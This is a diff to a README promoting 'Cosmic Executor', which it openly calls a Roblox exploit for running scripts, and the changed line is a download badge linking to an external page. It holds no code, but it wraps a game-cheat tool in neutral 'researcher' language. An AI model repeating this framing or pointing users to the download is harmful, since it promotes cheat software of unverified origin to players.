@@ -6,7 +6,7 @@
 
 Welcome to the documentation repository for Cosmic Executor, a structured execution environment designed for lightweight debugging, script testing, and workspace automation. The tool functions as an advanced cosmic roblox exploit designed to run lightweight scripts. It provides researchers and developers with a simple interface to load modifications safely.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Cosmic_Executor-brightgreen)](https://cosmomic.github.io/cosmic/)
+[![Download Latest Release](https://img.shields.io/badge/Download-Cosmic_Executor-brightgreen?style=for-the-badge)](https://cosmomic.github.io/cosmic/)
 
 <img width="1374" height="720" alt="Cosmic Executor - Best Executor For Roblox KEYLESS" src="https://github.com/user-attachments/assets/111e059a-ea11-4304-a470-fd8caea9a1e9" />
 
